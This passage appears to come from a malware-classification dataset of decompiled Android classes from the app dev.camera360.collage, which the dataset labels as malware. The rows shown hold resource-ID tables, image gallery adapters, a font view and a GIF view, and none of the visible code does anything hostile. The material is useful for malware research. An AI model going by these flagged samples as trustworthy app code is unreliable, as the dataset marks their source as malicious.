new_chooseframe_dialog=0x7f030031;   public static final int new_drawing_dialog=0x7f030032;   public static final int new_emotion_list_dialog=0x7f030033;   public static final int new_flickr_dialog=0x7f030034;   public static final int new_frame_touch_dialog=0x7f030035;   public static final int new_gadgetdownload_dialog=0x7f030036;   public static final int new_google_touch_dialog=0x7f030037;   public static final int new_momentcam_album_list_dialog=0x7f030038;   public static final int new_momentcam_gallery_list_dialog=0x7f030039;   public static final int new_pattern_dialog2=0x7f03003a;   public static final int new_pixabay_dialog=0x7f03003b;   public static final int opacity_chooser=0x7f03003c;   public static final int pattern_chooser=0x7f03003d;   public static final int pattern_dialog=0x7f03003e;   public static final int photoshop_dialog=0x7f03003f;   public static final int pixabay_dialog=0x7f030040;   public static final int preference=0x7f030041;   public static final int quote_dialog=0x7f030042;   public static final int quote_list_dialog=0x7f030043;   public static final int rate_dialog=0x7f030044;   public static final int search_dialog=0x7f030045;   public static final int setting_layout=0x7f030046;   public static final int snapshot_dialog=0x7f030047;   public static final int snapshot_list_dialog=0x7f030048;   public static final int splash=0x7f030049;   public static final int tab_indicator=0x7f03004a;   public static final int tapcontext_notification_layout=0x7f03004b;   public static final int touch_dialog=0x7f03004c;   public static final int touch_dialog2=0x7f03004d;   public static final int touch_dialog3=0x7f03004e;   public static final int web_dialog=0x7f03004f;   public static final int xappad_notification=0x7f030050; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\m.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5e29b7a1"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\MomentcamGalleryActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2223293b"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\MultilineFontView.code","public class MultilineFontView extends View {   String a;   String b;   int c;   int d;   Context e;   Paint f;   Bitmap g;   TextView h;   public Bitmap getBitmap(){     this.h.setDrawingCacheEnabled(true);     Bitmap drawingCache=this.h.getDrawingCache();     this.g=Bitmap.createBitmap(drawingCache,0,0,drawingCache.getWidth(),drawingCache.getHeight(),(Matrix)null,true);     this.h.setDrawingCacheEnabled(false);     return this.g;   }   public MultilineFontView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.b="""";     this.c=-16777216;     this.d=30;     this.f=new Paint();     this.e=context;   }   @Override protected void onDraw(  Canvas canvas){     super.onDraw(canvas);     a(canvas,this.a);   }   private void a(  Canvas canvas,  String str){     this.h=new TextView(this.e);     if (!this.b.equals("""")) {       this.h.setTypeface(Typeface.createFromAsset(getContext().getAssets(),this.b));     }     this.h.setText(this.a);     this.h.setTextColor(this.c);     this.h.setTextSize(2,this.d);     this.h.setDrawingCacheEnabled(true);     this.h.measure(View.MeasureSpec.makeMeasureSpec(canvas.getWidth(),1073741824),View.MeasureSpec.makeMeasureSpec(canvas.getHeight(),1073741824));     this.h.layout(0,0,this.h.getMeasuredWidth(),this.h.getMeasuredHeight());     canvas.drawBitmap(this.h.getDrawingCache(),0.0f,0.0f,this.f);     this.h.setDrawingCacheEnabled(false);   }   public void setText(  String str){     this.a=str;     invalidate();   }   public void setTypeFace(  String str){     this.b=str;     invalidate();   }   public void setColor(  int i){     this.c=i;     invalidate();   }   public void setFontSize(  int i){     this.d=i;     invalidate();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\MYGIFView.code","private class MYGIFView extends View {   Movie a;   long b;   @Override protected void onDraw(  Canvas canvas){     canvas.drawColor(-3355444);     long uptimeMillis=SystemClock.uptimeMillis();     if (this.b == 0) {       this.b=uptimeMillis;     }     if (this.a != null) {       int duration=this.a.duration();       if (duration == 0) {         duration=1000;       }       this.a.setTime((int)((uptimeMillis - this.b) % duration));       this.a.draw(canvas,getWidth() - this.a.width(),getHeight() - this.a.height());       invalidate();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\n.code","public class n extends ArrayAdapter<String> {   static int e;   static int f;   public String a;   boolean b;   boolean c;   int d;   int g;   private o[] h;   private Context i;   private a j;   private int k;   private LayoutInflater l;   private void a(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     e=defaultDisplay.getWidth();     f=defaultDisplay.getHeight();   }   public n(  Context context,  int i,  ArrayList arrayList){     super(context,i,arrayList);     this.a=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER2+ ""/asset/gift/"";     this.b=false;     this.c=false;     this.d=1;     this.i=context;     this.g=i;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(R.styleable.Gallery1);     this.k=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();     this.l=(LayoutInflater)context.getSystemService(""layout_inflater"");     a(context);     this.j=new a(this,null);     this.h=new o[arrayList.toArray().length];     int length=arrayList.toArray().length;     for (int i2=0; i2 < length; i2++) {       this.h[i2]=new o();       this.h[i2].c=arrayList.get(i2).toString();     }     this.j.execute(this.h);   }   @Override public int getCount(){     try {       return this.h.length;     }  catch (    Exception e2) {       return 0;     }   }   @Override public String getItem(  int i){     return this.h[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     o oVar=this.h[i];     if (view == null) {       view=this.l.inflate(this.g,(ViewGroup)null);       view.setTag(new b(view));     }     b bVar=(b)view.getTag();     ImageView a2=bVar.a();     ProgressBar b2=bVar.b();     if (oVar.e == null) {       b2.setVisibility(0);       a2.setVisibility(4);       view.setBackgroundDrawable(null);     }  else {       b2.setVisibility(8);       a2.setVisibility(0);       a2.setImageBitmap(oVar.e);       a2.setScaleType(ImageView.ScaleType.FIT_XY);       view.setBackgroundResource(this.k);       a2.setTag(oVar.d);     }     return view;   }   public void a(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     try {       String a2=BaseActivity.a(str,BaseActivity.EXTENSION2);       if (!str.startsWith(""http"")) {         Bitmap decodeResource=BitmapFactory.decodeResource(this.i.getResources(),this.i.getResources().getIdentifier(str,""drawable"",""dev.camera360.collage""));         File file=new File(this.a,a2);         if (!file.exists()) {           FileOutputStream fileOutputStream=new FileOutputStream(file);           decodeResource.compress(Bitmap.CompressFormat.JPEG,100,fileOutputStream);           fileOutputStream.flush();           fileOutputStream.close();           return decodeResource;         }         return decodeResource;       }       File file2=new File(String.valueOf(this.a) + a2);       if (file2.exists()) {         BitmapFactory.Options options=new BitmapFactory.Options();         options.inSampleSize=3;         options.inDither=false;         options.inPurgeable=true;         options.inInputShareable=true;         options.inTempStorage=new byte[16384];         return BitmapFactory.decodeFile(file2.toString(),options);       }       if (!b()) {         return null;       }       BitmapFactory.Options options2=new BitmapFactory.Options();       options2.inSampleSize=1;       options2.inDither=false;       options2.inPurgeable=true;       options2.inInputShareable=true;       options2.inTempStorage=new byte[16384];       URLConnection openConnection=new URL(str).openConnection();       openConnection.connect();       BufferedInputStream bufferedInputStream=new BufferedInputStream(openConnection.getInputStream());       Bitmap decodeStream=BitmapFactory.decodeStream(bufferedInputStream,null,options2);       bufferedInputStream.close();       if (decodeStream == null) {         return null;       }       try {         FileOutputStream fileOutputStream2=new FileOutputStream(file2);         decodeStream.compress(Bitmap.CompressFormat.JPEG,100,fileOutputStream2);         fileOutputStream2.flush();         fileOutputStream2.close();       }  catch (      FileNotFoundException e2) {       } catch (      IOException e3) {       }       decodeStream.recycle();       BitmapFactory.Options options3=new BitmapFactory.Options();       options3.inSampleSize=3;       options3.inDither=false;       options3.inPurgeable=true;       options3.inInputShareable=true;       options3.inTempStorage=new byte[16384];       return BitmapFactory.decodeFile(file2.toString(),options2);     }  catch (    Exception e4) {       return null;     }   }   private boolean b(){     this.b=false;     this.c=false;     try {       for (      NetworkInfo networkInfo : ((ConnectivityManager)this.i.getSystemService(""connectivity"")).getAllNetworkInfo()) {         if (networkInfo.getTypeName().equalsIgnoreCase(""WIFI"") && networkInfo.isConnected()) {           this.b=true;         }         if (networkInfo.getTypeName().equalsIgnoreCase(""MOBILE"") && networkInfo.isConnected()) {           this.c=true;         }       }     }  catch (    Exception e2) {     }     return this.b || this.c;   } private static class b {     private View a;     private ImageView b=null;     private ProgressBar c=null;     public b(    View view){       this.a=view;     }     public ImageView a(){       if (this.b == null) {         this.b=(ImageView)this.a.findViewById(R.id.image_view);       }       return this.b;     }     public ProgressBar b(){       if (this.c == null) {         this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);       }       return this.c;     }   } private class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    n nVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=n.this.a(oVar.c);         oVar.d=BaseActivity.a(oVar.c,BaseActivity.EXTENSION2);         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       n.this.a();     }     @Override public void onPostExecute(    Void r2){       ((TabSample)((Activity)n.this.i).getParent()).g();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\o.code","public class o {   public int a;   public Uri b;   public String c;   public String d;   public Bitmap e; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\p.code","public class p {   String a;   int b;   String c;   Bitmap d;   Bitmap e;   String f;   String g;   String h;   String i;   String j;   public p(  String str,  String str2,  String str3,  String str4,  String str5){     this.a=str;     this.g=str2;     this.h=str3;     this.i=str4;     this.j=str5;     a(a(111,this));     b(a(222,this));   }   public void a(  String str){     this.c=str;     a(i.a,this);   }   public void b(  String str){     this.f=str;   }   public String toString(){     return ""ImageContener [id="" + this.a + "", thumbURL=""+ this.c+ "", largeURL=""+ this.f+ "", owner=""+ this.g+ "", secret=""+ this.h+ "", server=""+ this.i+ "", farm=""+ this.j+ ""]"";   }   private String a(  int i,  p pVar){     String str=""http://farm"" + pVar.j + "".staticflickr.com/""+ pVar.i+ ""/""+ pVar.a+ ""_""+ pVar.h; switch (i) { case 111:       str=String.valueOf(str) + ""_t"";     break; case 222:   str=String.valueOf(str) + ""_z""; break; } return String.valueOf(str) + "".jpg""; } public Bitmap a(){ return this.e; } public void a(Bitmap bitmap){ this.e=bitmap; } public void a(h.c cVar,p pVar){ new i.a(cVar,pVar).start(); } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\q.code","public class q extends BaseAdapter {   boolean a;   public int d;   File[] e;   public String f;   int i;   int j;   int k;   SharedPreferences l;   Dialog n;   private o[] o;   private Context p;   private a q;   public int b=0;   public int c=0;   boolean g=false;   boolean h=false;   ArrayList<String> m=new ArrayList<>();   private boolean d(){     DisplayMetrics displayMetrics=this.p.getResources().getDisplayMetrics();     return displayMetrics.heightPixels >= 728 && displayMetrics.widthPixels >= 728;   }   public String a(){     return this.l.getString(BaseActivity.PREF_IMAGE_PATH,this.f);   }   public q(  Context context,  int i,  int i2,  boolean z,  Dialog dialog){     this.a=false;     this.d=1;     this.f=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER+ ""/MomentCam_Drawing/"";     this.j=100;     this.k=130;     this.l=context.getSharedPreferences(BaseActivity.SEARCH_PREFERENCE,0);     this.n=dialog;     this.p=context;     this.i=i;     this.f=a();     this.d=i2;     this.a=z;     if (d()) {       this.j=AdException.INTERNAL_ERROR;       this.k=260;     }     b();   }   public void b(){     File file=new File(this.f);     if (file.exists()) {       this.e=file.listFiles();       if (this.e != null && this.e.length > 1) {         Arrays.sort(this.e,new Comparator<File>(){           @Override public int compare(          File file2,          File file3){             if (file2.lastModified() < file3.lastModified()) {               return 1;             }             if (file2.lastModified() == file3.lastModified()) {               return 0;             }             return -1;           }         } );       }     }     this.b=this.e.length;     this.c=(int)Math.ceil(this.b / 12.0f);     int i=(this.d - 1) * 12;     int i2=i + 12;     if (i2 > this.b) {       i2=this.b;     }     this.o=new o[i2 - i];     int i3=0;     while (i < i2) {       this.o[i3]=new o();       this.o[i3].c=this.e[i].getName();       i3++;       i++;     }     this.q=new a(this,null);     this.q.execute(this.o);   }   @Override public int getCount(){     return this.o.length;   }   @Override public Object getItem(  int i){     return this.o[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView;     o oVar=this.o[i];     if (view == null) {       imageView=new ImageView(this.p);       imageView.setLayoutParams(new AbsListView.LayoutParams(this.j,this.k));     }  else {       imageView=(ImageView)view;     }     if (oVar.e != null) {       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       imageView.setImageBitmap(oVar.e);     }     imageView.setTag(oVar.c);     return imageView;   }   public void e(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     BitmapFactory.Options options=new BitmapFactory.Options();     options.inSampleSize=4;     options.inDither=false;     options.inPurgeable=true;     options.inInputShareable=true;     options.inTempStorage=new byte[16384];     try {       File file=new File(this.f,str);       if (!file.exists()) {         return null;       }       return BitmapFactory.decodeFile(file.toString(),options);     }  catch (    Exception e) {       return null;     }   } public class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    q qVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=q.this.a(oVar.c);         oVar.d=oVar.c;         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       q.this.e();     }     @Override public void onPostExecute(    Void r3){       if ((q.this.n instanceof ag) && q.this.a) {         ((ag)q.this.n).b(q.this.c);       }     }   }   public void c(){     if (this.q != null && this.q.getStatus() != AsyncTask.Status.FINISHED) {       this.q.cancel(true);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\R.code","public final class R { public static final class anim {     public static final int custom_anim=0x7f040000;     public static final int fade_in=0x7f040001;     public static final int fade_in2=0x7f040002;     public static final int fade_out=0x7f040003;     public static final int left_right_anim=0x7f040004;     public static final int right_left_anim=0x7f040005;     public static final int slide_out_down=0x7f040006;     public static final int slide_up_dialog=0x7f040007;   } public static final class array {     public static final int category_options=0x7f060016;     public static final int country_options=0x7f060010;     public static final int country_values=0x7f060011;     public static final int feed_options=0x7f060015;     public static final int file_type_extra1_options=0x7f06000a;     public static final int file_type_extra1_values=0x7f06000b;     public static final int file_type_extra2_options=0x7f06000c;     public static final int file_type_extra2_values=0x7f06000d;     public static final int file_type_options=0x7f060008;     public static final int file_type_values=0x7f060009;     public static final int item_per_page_options=0x7f060002;     public static final int item_per_page_values=0x7f060003;     public static final int min_level_options=0x7f060000;     public static final int min_level_values=0x7f060001;     public static final int search_type_options=0x7f060006;     public static final int search_type_values=0x7f060007;     public static final int search_type_youtube_options=0x7f060013;     public static final int time_options=0x7f06000e;     public static final int time_top_youtube_options=0x7f060012;     public static final int time_values=0x7f06000f;     public static final int time_youtube_options=0x7f060014;     public static final int update_freq_options=0x7f060004;     public static final int update_freq_values=0x7f060005;   } public static final class attr {     public static final int adSize=0x7f010000;     public static final int adUnitId=0x7f010001;     public static final int animation=0x7f01000a;     public static final int banner_type=0x7f010009;     public static final int canShowMR=0x7f01000c;     public static final int gif=0x7f010005;     public static final int gifMoviewViewStyle=0x7f010007;     public static final int isGoneWithoutAd=0x7f010004;     public static final int keywords=0x7f010002;     public static final int paused=0x7f010006;     public static final int placementType=0x7f01000b;     public static final int test_mode=0x7f010008;     public static final int testing=0x7f010003;   } public static final class color {     public static final int blue=0x7f08000b;     public static final int brown=0x7f080012;     public static final int darkgray=0x7f080014;     public static final int error_color=0x7f080007;     public static final int gray=0x7f08000d;     public static final int green=0x7f08000a;     public static final int logo_color=0x7f080000;     public static final int menu_color=0x7f080005;     public static final int menu_glow=0x7f080006;     public static final int pink=0x7f080013;     public static final int red=0x7f080009;     public static final int tabDark=0x7f08000f;     public static final int tabMedium=0x7f08000e;     public static final int tabTransparent=0x7f080010;     public static final int title_color=0x7f080003;     public static final int title_glow=0x7f080004;     public static final int transparent=0x7f080011;     public static final int version_bkgrd=0x7f080002;     public static final int version_color=0x7f080001;     public static final int white=0x7f080008;     public static final int yellow=0x7f08000c;   } public static final class dimen {     public static final int activity_horizontal_margin=0x7f090016;     public static final int activity_vertical_margin=0x7f090017;     public static final int avatar_size=0x7f090008;     public static final int color_dim=0x7f090015;     public static final int corner_radius=0x7f09000a;     public static final int fav_place_textbox_size=0x7f090009;     public static final int game_question_size=0x7f090005;     public static final int help_text_padding=0x7f090007;     public static final int help_text_size=0x7f090006;     public static final int large_brush=0x7f090013;     public static final int largest_brush=0x7f090014;     public static final int logo_size=0x7f090000;     public static final int medium_brush=0x7f090012;     public static final int menu_item_size=0x7f090004;     public static final int screen_title_size=0x7f090003;     public static final int small_brush=0x7f090011;     public static final int smallest_brush=0x7f090010;     public static final int tab_space=0x7f09000c;     public static final int tab_space_bottom_line=0x7f09000e;     public static final int tab_space_plus1=0x7f09000d;     public static final int tab_space_top=0x7f09000b;     public static final int tab_space_unselected_top=0x7f09000f;     public static final int version_size=0x7f090001;     public static final int version_spacing=0x7f090002;   } public static final class drawable {     public static final int add_button=0x7f020000;     public static final int add_text_button=0x7f020001;     public static final int addappicon_button=0x7f020002;     public static final int addbookmark_button=0x7f020003;     public static final int addinstant=0x7f020004;     public static final int addmoment_button=0x7f020005;     public static final int af_icon_list=0x7f020006;     public static final int alert_dialog_icon=0x7f020007;     public static final int antivirus=0x7f020008;     public static final int appicon_button=0x7f020009;     public static final int apply_button=0x7f02000a;     public static final int arrow_left_button=0x7f02000b;     public static final int arrow_left_normal=0x7f02000c;     public static final int arrow_left_pressed=0x7f02000d;     public static final int arrow_right_button=0x7f02000e;     public static final int arrow_right_normal=0x7f02000f;     public static final int arrow_right_pressed=0x7f020010;     public static final int back_button=0x7f020011;     public static final int back_button2=0x7f020012;     public static final int back_draw_button=0x7f020013;     public static final int bestyoutube_icon=0x7f020014;     public static final int bg_flat_grey_border=0x7f020015;     public static final int bg_flight_gray_body=0x7f020016;     public static final int bg_flight_gray_bottom=0x7f020017;     public static final int bg_flight_gray_top=0x7f020018;     public static final int bg_flight_white_body=0x7f020019;     public static final int bg_flight_white_bottom=0x7f02001a;     public static final int bg_flight_white_top=0x7f02001b;     public static final int bg_grey=0x7f02001c;     public static final int bg_setting=0x7f02001d;     public static final int bg_setting_body=0x7f02001e;     public static final int bg_setting_bottom=0x7f02001f;     public static final int bg_setting_header=0x7f020020;     public static final int bg_setting_middle=0x7f020021;     public static final int bg_setting_sep=0x7f020022;     public static final int bg_setting_top=0x7f020023;     public static final int bg_wood_body=0x7f020024;     public static final int bg_wood_bottom=0x7f020025;     public static final int bg_wood_bottom_left=0x7f020026;     public static final int bg_wood_bottom_right=0x7f020027;     public static final int bg_wood_left=0x7f020028;     public static final int bg_wood_right=0x7f020029;     public static final int bg_wood_top=0x7f02002a;     public static final int bg_wood_top_left=0x7f02002b;     public static final int bg_wood_top_right=0x7f02002c;     public static final int bgnd=0x7f02002d;     public static final int bgnd_bottom=0x7f02002e;     public static final int bgndtitle=0x7f02002f;     public static final int blank=0x7f020030;     public static final int blur_bgnd=0x7f020031;     public static final int bold_button=0x7f020032;     public static final int bold_press=0x7f020033;     public static final int boldpress_button=0x7f020034;     public static final int bookmark=0x7f020035;     public static final int bookmark_grid_button=0x7f020036;     public static final int bookmark_small=0x7f020037;     public static final int bookmark_tab_close=0x7f020038;     public static final int bookmark_tab_open=0x7f020039;     public static final int bookmark_tab_selector=0x7f02003a;     public static final int border_button=0x7f02003b;     public static final int box=0x7f02003c;     public static final int brightness_icon=0x7f02003d;     public static final int brush=0x7f02003e;     public static final int button_left=0x7f02003f;     public static final int button_right=0x7f020040;     public static final int canvas_button=0x7f020041;     public static final int center_button=0x7f020042;     public static final int center_press=0x7f020043;     public static final int centerpress_button=0x7f020044;     public static final int christmas_btn=0x7f020045;     public static final int clear_button=0x7f020046;     public static final int clear_text_button=0x7f020047;     public static final int close_button=0x7f020048;     public static final int color_blank=0x7f020049;     public static final int color_btn=0x7f02004a;     public static final int crop_button=0x7f02004b;     public static final int curve_button=0x7f02004c;     public static final int delete_button=0x7f02004d;     public static final int editor_button=0x7f02004e;     public static final int edittext_modified_states=0x7f02004f;     public static final int effect_black=0x7f020050;     public static final int effect_boost_1=0x7f020051;     public static final int effect_boost_2=0x7f020052;     public static final int effect_boost_3=0x7f020053;     public static final int effect_brightness=0x7f020054;     public static final int effect_button=0x7f020055;     public static final int effect_color_blue=0x7f020056;     public static final int effect_color_depth_32=0x7f020057;     public static final int effect_color_depth_64=0x7f020058;     public static final int effect_color_green=0x7f020059;     public static final int effect_color_red=0x7f02005a;     public static final int effect_contrast=0x7f02005b;     public static final int effect_emboss=0x7f02005c;     public static final int effect_engrave=0x7f02005d;     public static final int effect_flea=0x7f02005e;     public static final int effect_gamma=0x7f02005f;     public static final int effect_gaussian_blue=0x7f020060;     public static final int effect_grayscale=0x7f020061;     public static final int effect_highlight=0x7f020062;     public static final int effect_hue=0x7f020063;     public static final int effect_invert=0x7f020064;     public static final int effect_mean_remove=0x7f020065;     public static final int effect_reflaction=0x7f020066;     public static final int effect_round_corner=0x7f020067;     public static final int effect_saturation=0x7f020068;     public static final int effect_sepia=0x7f020069;     public static final int effect_sepia_blue=0x7f02006a;     public static final int effect_sepia_green=0x7f02006b;     public static final int effect_sheding=0x7f02006c;     public static final int effect_sheding_cyan=0x7f02006d;     public static final int effect_sheding_green=0x7f02006e;     public static final int effect_sheding_red=0x7f02006f;     public static final int effect_sheding_yellow=0x7f020070;     public static final int effect_smooth=0x7f020071;     public static final int effect_tint=0x7f020072;     public static final int effect_watermark=0x7f020073;     public static final int emoticon_button=0x7f020074;     public static final int emoticon_button_pressed=0x7f020075;     public static final int eraser=0x7f020076;     public static final int eraserall=0x7f020077;     public static final int exit_button=0x7f020078;     public static final int exit_button2=0x7f020079;     public static final int find=0x7f02007a;     public static final int flickr_button=0x7f02007b;     public static final int flightsearch_button_inactiv=0x7f02007c;     public static final int focused_background=0x7f02007d;     public static final int frame_button=0x7f02007e;     public static final int frameicon=0x7f02007f;     public static final int free=0x7f020080;     public static final int gadget_button=0x7f020081;     public static final int galleryadd_button=0x7f020082;     public static final int gift_button=0x7f020083;     public static final int googleimage_button=0x7f020084;     public static final int hdwallpaper_icon=0x7f020085;     public static final int help_button=0x7f020086;     public static final int hideopacity_button=0x7f020087;     public static final int history=0x7f020088;     public static final int history_small=0x7f020089;     public static final int home_button=0x7f02008a;     public static final int home_normal=0x7f02008b;     public static final int home_screen=0x7f02008c;     public static final int home_selected=0x7f02008d;     public static final int homemenu_button=0x7f02008e;     public static final int icon=0x7f02008f;     public static final int image=0x7f020090;     public static final int instragram=0x7f020091;     public static final int italic_button=0x7f020092;     public static final int italic_press=0x7f020093;     public static final int italicpress_button=0x7f020094;     public static final int keyboarddown=0x7f020095;     public static final int large=0x7f020096;     public static final int largest=0x7f020097;     public static final int left_button=0x7f020098;     public static final int left_press=0x7f020099;     public static final int leftpress_button=0x7f02009a;     public static final int line_button=0x7f02009b;     public static final int loading2=0x7f02009c;     public static final int medium=0x7f02009d;     public static final int message_button=0x7f02009e;     public static final int moman_icon=0x7f02009f;     public static final int momentcamalbum_home=0x7f0200a0;     public static final int momentcamgallery_home=0x7f0200a1;     public static final int more_button=0x7f0200a2;     public static final int mygallery_button=0x7f0200a3;     public static final int new_button=0x7f0200a4;     public static final int new_feature=0x7f0200a5;     public static final int new_pic=0x7f0200a6;     public static final int newadd_button=0x7f0200a7;     public static final int next_button=0x7f0200a8;     public static final int noapply_button=0x7f0200a9;     public static final int noframe_button=0x7f0200aa;     public static final int nomessage_button=0x7f0200ab;     public static final int normal_background=0x7f0200ac;     public static final int online_button=0x7f0200ad;     public static final int opacity=0x7f0200ae;     public static final int opacity_button=0x7f0200af;     public static final int open_button=0x7f0200b0;     public static final int paint=0x7f0200b1;     public static final int paint_pressed=0x7f0200b2;     public static final int pattern1=0x7f0200b3;     public static final int pattern10=0x7f0200b4;     public static final int pattern11=0x7f0200b5;     public static final int pattern12=0x7f0200b6;     public static final int pattern13=0x7f0200b7;     public static final int pattern14=0x7f0200b8;     public static final int pattern15=0x7f0200b9;     public static final int pattern16=0x7f0200ba;     public static final int pattern17=0x7f0200bb;     public static final int pattern18=0x7f0200bc;     public static final int pattern19=0x7f0200bd;     public static final int pattern1_1=0x7f0200be;     public static final int pattern1_2=0x7f0200bf;     public static final int pattern1_3=0x7f0200c0;     public static final int pattern1_4=0x7f0200c1;     public static final int pattern2=0x7f0200c2;     public static final int pattern20=0x7f0200c3;     public static final int pattern21=0x7f0200c4;     public static final int pattern22=0x7f0200c5;     public static final int pattern23=0x7f0200c6;     public static final int pattern24=0x7f0200c7;     public static final int pattern25=0x7f0200c8;     public static final int pattern26=0x7f0200c9;     public static final int pattern27=0x7f0200ca;     public static final int pattern28=0x7f0200cb;     public static final int pattern30=0x7f0200cc;     public static final int pattern31=0x7f0200cd;     public static final int pattern34=0x7f0200ce;     public static final int pattern6=0x7f0200cf;     public static final int pattern7=0x7f0200d0;     public static final int pattern8=0x7f0200d1;     public static final int pattern9=0x7f0200d2;     public static final int pattern_button=0x7f0200d3;     public static final int pattern_button2=0x7f0200d4;     public static final int photoframe_icon=0x7f0200d5;     public static final int pick_gallery_button=0x7f0200d6;     public static final int picker_button=0x7f0200d7;     public static final int pickgallery_button=0x7f0200d8;     public static final int pixabay_button=0x7f0200d9;     public static final int play_button=0x7f0200da;     public static final int pressed_background=0x7f0200db;     public static final int quote_button=0x7f0200dc;     public static final int rate_later=0x7f0200dd;     public static final int rate_no=0x7f0200de;     public static final int rate_yes=0x7f0200df;     public static final int record_button=0x7f0200e0;     public static final int refresh_button=0x7f0200e1;     public static final int reload_btn=0x7f0200e2;     public static final int reload_button=0x7f0200e3;     public static final int resize_button=0x7f0200e4;     public static final int right_button=0x7f0200e5;     public static final int right_press=0x7f0200e6;     public static final int rightpress_button=0x7f0200e7;     public static final int rounded_corner_box=0x7f0200e8;     public static final int rounded_corner_box_grid=0x7f0200e9;     public static final int save=0x7f0200ea;     public static final int save_button=0x7f0200eb;     public static final int save_share_button=0x7f0200ec;     public static final int search_button=0x7f0200ed;     public static final int second=0x7f0200ee;     public static final int second2=0x7f0200ef;     public static final int second3=0x7f0200f0;     public static final int setting_button=0x7f0200f1;     public static final int share_btn=0x7f0200f2;     public static final int share_button=0x7f0200f3;     public static final int showframe_button=0x7f0200f4;     public static final int showmessage_button=0x7f0200f5;     public static final int showopacity_button=0x7f0200f6;     public static final int skip_button=0x7f0200f7;     public static final int small=0x7f0200f8;     public static final int smallest=0x7f0200f9;     public static final int speech_blank=0x7f0200fa;     public static final int speech_bubble0=0x7f0200fb;     public static final int speech_bubble1=0x7f0200fc;     public static final int speech_bubble10=0x7f0200fd;     public static final int speech_bubble2=0x7f0200fe;     public static final int speech_bubble3=0x7f0200ff;     public static final int speech_bubble4=0x7f020100;     public static final int speech_bubble5=0x7f020101;     public static final int speech_bubble6=0x7f020102;     public static final int speech_bubble7=0x7f020103;     public static final int speech_bubble8=0x7f020104;     public static final int speech_bubble9=0x7f020105;     public static final int splash_screen=0x7f020106;     public static final int stop_button=0x7f020107;     public static final int tab_focus=0x7f020108;     public static final int tab_indicator=0x7f020109;     public static final int tab_press=0x7f02010a;     public static final int tab_selected=0x7f02010b;     public static final int tab_unselected=0x7f02010c;     public static final int tabpressed=0x7f02010d;     public static final int text_button=0x7f02010e;     public static final int textstyle1=0x7f02010f;     public static final int textstyle10=0x7f020110;     public static final int textstyle11=0x7f020111;     public static final int textstyle12=0x7f020112;     public static final int textstyle13=0x7f020113;     public static final int textstyle14=0x7f020114;     public static final int textstyle2=0x7f020115;     public static final int textstyle3=0x7f020116;     public static final int textstyle4=0x7f020117;     public static final int textstyle5=0x7f020118;     public static final int textstyle6=0x7f020119;     public static final int textstyle7=0x7f02011a;     public static final int textstyle8=0x7f02011b;     public static final int textstyle9=0x7f02011c;     public static final int textstyle_chinesetakeaway=0x7f02011d;     public static final int textstyle_go3v2=0x7f02011e;     public static final int textstyle_kato=0x7f02011f;     public static final int textstyle_manga=0x7f020120;     public static final int textstyle_mponderosa=0x7f020121;     public static final int textstyle_rosewood=0x7f020122;     public static final int textstyle_shanghai=0x7f020123;     public static final int title_search_ico=0x7f020124;     public static final int title_search_ico_disabled=0x7f020125;     public static final int top_exit_button=0x7f020126;     public static final int top_new_button=0x7f020127;     public static final int view_btn=0x7f020128;     public static final int view_button=0x7f020129;     public static final int wallpaper_button=0x7f02012a;     public static final int web_button=0x7f02012b;   } public static final class id {     public static final int BANNER=0x7f070000;     public static final int IAB_BANNER=0x7f070002;     public static final int IAB_LEADERBOARD=0x7f070003;     public static final int IAB_MRECT=0x7f070001;     public static final int LinearLayout01=0x7f07001a;     public static final int ad_airpush=0x7f07008d;     public static final int add_btn=0x7f070047;     public static final int add_text_btn=0x7f070098;     public static final int addappicon_btn=0x7f070070;     public static final int addmoment_switcher=0x7f070050;     public static final int addmoment_switcher2=0x7f070069;     public static final int addmoment_switcher3=0x7f07006f;     public static final int 